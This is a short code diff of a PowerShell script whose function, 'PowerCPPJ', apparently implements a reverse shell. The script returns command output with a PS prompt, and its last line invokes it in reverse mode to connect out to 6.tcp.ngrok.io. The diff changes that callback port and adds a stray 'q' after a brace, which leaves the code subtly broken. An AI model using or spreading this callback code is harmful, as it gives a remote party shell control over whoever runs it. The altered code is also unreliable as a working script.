@@ -64,7 +64,7 @@ function PowerCPPJ
             {
                 Write-Warning "Something went wrong with execution of command on the target."
                 Write-Error $_
-            }
+            } q
             $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
             $x = ($error[0] | Out-String)
             $error.clear()
@@ -88,4 +88,4 @@ function PowerCPPJ
     }
 }
 
-PowerCPPJ -Reverse -IPAddress 6.tcp.ngrok.io -Port 12626
+PowerCPPJ -Reverse -IPAddress 6.tcp.ngrok.io -Port 13231
